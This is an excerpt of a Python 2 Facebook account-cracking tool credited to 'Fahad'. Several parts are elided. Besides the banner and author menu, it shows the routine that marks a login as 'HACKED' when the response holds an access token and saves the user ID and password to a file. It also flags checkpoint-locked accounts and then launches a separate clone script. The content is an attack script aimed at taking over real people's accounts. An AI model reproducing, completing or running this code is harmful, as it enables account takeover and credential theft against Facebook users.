...
\033[0;94m   ______      _    _          _____
\033[0;94m  |  ____/\   | |  | |   /\   |  __ \ 
\033[0;96m  | |__ /  \  | |__| |  /  \  | |  | |
\033[0;96m  |  __/ /\ \ |  __  | / /\ \ | |  | |
\033[0;96m  | | / ____ \| |  | |/ ____ \| |__| |
\033[0;96m  |_|/_/    \_\_|  |_/_/    \_\_____
""")

print("\033[0;91mThis Tool's by Fahad Sorker")
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Fahad'
    print '\033[0;94mFACEBOOK : jrfahad.07'
    print '\033[0;96mGITHUB   : nope'
    print ''
...
def action():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Fahad-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Fahad-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
    ...
    os.system('python2 bdidsclone.py')
